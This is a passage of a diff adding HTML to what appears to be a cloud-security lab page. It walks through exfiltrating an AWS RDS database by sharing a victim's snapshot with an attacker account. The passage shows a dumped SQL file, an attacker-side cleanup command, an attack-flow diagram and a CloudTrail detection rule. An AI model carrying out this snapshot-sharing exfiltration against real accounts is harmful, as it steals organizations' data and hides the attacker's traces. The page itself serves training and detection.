+              <div class="terminal-cmd">$ ls -lh full_dump.sql</div>
+              <div class="terminal-output">-rw-r--r--  1 user  staff  2.3G Mar 16 15:30 full_dump.sql</div>
+              <div class="terminal-cmd">$ wc -l full_dump.sql</div>
+              <div class="terminal-output">4,521,890 full_dump.sql</div>
+              <div class="terminal-cmd"># Clean up — delete the attacker's RDS instance</div>
+              <div class="terminal-cmd">$ aws rds delete-db-instance --db-instance-identifier loot-db \
+  --skip-final-snapshot --profile attacker</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Victim Snapshot</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Share to Attacker</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Restore Instance</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Reset Password</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Full DB Access</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i>
+      This is one of the most dangerous AWS data exfiltration techniques. The <code>ModifyDBSnapshotAttribute</code> API call generates a CloudTrail event, but many organizations do not monitor for snapshot sharing. Detection rule: alert on any <code>ModifyDBSnapshotAttribute</code> call where <code>valuesToAdd</code> contains an account ID outside the organization.
+    </div>
+  </div>
+
+</div>
